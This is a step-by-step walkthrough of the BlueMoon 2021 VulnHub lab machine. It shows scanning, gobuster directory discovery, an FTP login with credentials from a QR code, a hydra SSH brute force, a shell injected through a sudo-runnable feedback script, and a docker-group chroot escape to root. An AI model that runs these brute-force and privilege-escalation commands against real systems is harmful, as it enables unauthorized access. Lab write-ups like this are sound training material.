# BlueMoon-2021-VulnHub-Walkthrough

A step-by-step lab guide for the BlueMoon 2021 VulnHub machine.

---

## 🖥️ Setup

- Download the machine from [VulnHub](https://www.vulnhub.com/entry/bluemoon-2021,679/)
- Import and start it in **VirtualBox**

---

## Step 1 — Find Your IP

```bash
ifconfig
```
![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/c13ea1826b0490f5555b3b6f1c0d2ff1b79e3cc6/images/ifconfig.png)
> Note your attacker machine's IP address (`192.168.56.102`)

---

## Step 2 — Discover Target on Network

```bash
nmap -sP 192.168.56.0/24
```
![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/8f0d30e149a3bf52605197797451d3c289ff7a27/images/scanning.png)
> Identify the BlueMoon machine IP (`192.168.56.101`)

---

## Step 3 — Port Scan

```bash
nmap 192.168.56.101
```
![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/8f0d30e149a3bf52605197797451d3c289ff7a27/images/searchopenport.png)

**Open ports found:**
| Port | Service |
|------|---------|
| 21   | FTP     |
| 22   | SSH     |
| 80   | HTTP    |

---

## Step 4 — Web HTTP

Visit `http://192.168.56.101` in your browser. Nothing useful found.

![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/8f0d30e149a3bf52605197797451d3c289ff7a27/images/http.png)

Run Gobuster to find hidden directories:

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/8f0d30e149a3bf52605197797451d3c289ff7a27/images/gobuster.png)
> Found: `/hidden_text`

---

## Step 5 — Explore Hidden Directory

- Go to `http://192.168.56.101/hidden_text`

![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/8f0d30e149a3bf52605197797451d3c289ff7a27/images/hidden.png)
- Click the **"Thank you…"** link
- A **QR code image** will appear — download it

![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/8f0d30e149a3bf52605197797451d3c289ff7a27/images/qr.png)

Decode the QR code at [https://zxing.org/w/decode.jspx](https://zxing.org/w/decode.jspx)
![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/8f0d30e149a3bf52605197797451d3c289ff7a27/images/decode.png)

**Credentials found:**
```
USER: userftp
PASSWORD: ftpp@ssword
```

---

## Step 6 — Login via FTP

```bash
ftp 192.168.56.101
```
![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/8f0d30e149a3bf52605197797451d3c289ff7a27/images/ftp.png)

List and download files:

```bash
ls
get information.txt
get p_lists.txt
```
![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/8f0d30e149a3bf52605197797451d3c289ff7a27/images/getftp.png)

Read the files:

```bash
cat information.txt
```
![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/8f0d30e149a3bf52605197797451d3c289ff7a27/images/catinformation.png)

```bash
cat p_lists.txt
```
![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/8f0d30e149a3bf52605197797451d3c289ff7a27/images/catp_lists.png)

> `information.txt` reveals a username: **robin**  
> `p_lists.txt` is a password list

---

## Step 7 — Brute Force SSH with Hydra

```bash
hydra -l robin -P p_lists.txt ssh://192.168.56.101
```
![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/454f19d586ec1ec75f8ca2f5f17bc23256241f9a/images/hydra.png)

**Credentials found:**
```
Login: robin
Password: k4rv3ndh4nh4ck3r
```

---

## Step 8 — SSH Login & First Flag

```bash
ssh robin@192.168.56.101
```
![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/24e41d391320c45043af5286933cd4dc68d077ce/images/ssh.png)
```bash
ls -l
cat user1.txt
```
![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/24798571cf2ffb73aea654a2e791f06b43d77466/images/catuser1.txt.png)
> 🚩 **Flag 1 obtained!**

---

## Step 9 — Privilege Escalation to Jerry

```bash
sudo -l
```
![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/24e41d391320c45043af5286933cd4dc68d077ce/images/sudo-l.png)

```bash
cd project
ls
cat feedback.sh
```

![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/d14b8aacf0a53f334131b22b3ca0bad2d8d6225a/images/project.png)

![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/d14b8aacf0a53f334131b22b3ca0bad2d8d6225a/images/catfeedback.png)

> `feedback.sh` can be run as user **jerry**

Run the script as jerry:

```bash
sudo -u jerry /home/robin/project/feedback.sh
```

![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/e316640ec36634e7982a386edf7275a2cfd068cf/images/runasjerry.png)

- When prompted for **name**, type: `jerry`
- When prompted for **feedback**, type: `/bin/bash`

```bash
ls
pwd
cd /home/jerry
ls
cat user2.txt
```

![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/d14b8aacf0a53f334131b22b3ca0bad2d8d6225a/images/feedback.png)

> 🚩 **Flag 2 obtained!**

---

## Step 10 — Escalate to Root via Docker

Upgrade to interactive shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/e316640ec36634e7982a386edf7275a2cfd068cf/images/python.png)

Check group membership:

```bash
id
```

![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/e316640ec36634e7982a386edf7275a2cfd068cf/images/iddocker.png)

> User **jerry** is in the **docker** group

List available Docker images:

```bash
docker image ls
```

![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/e316640ec36634e7982a386edf7275a2cfd068cf/images/dockerimagels.png)

Exploit the Alpine image to get root:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

```bash
id
cd /root
ls -al
cat root.txt
```

![alt text](https://github.com/denniiyyy/BlueMoon-2021-VulnHub-Walkthrough/blob/db9c66e1c7d73ce3ac13129497e077a77d5e9459/images/dockeralpine.png)

> 🚩 **Root flag obtained! Machine pwned!**

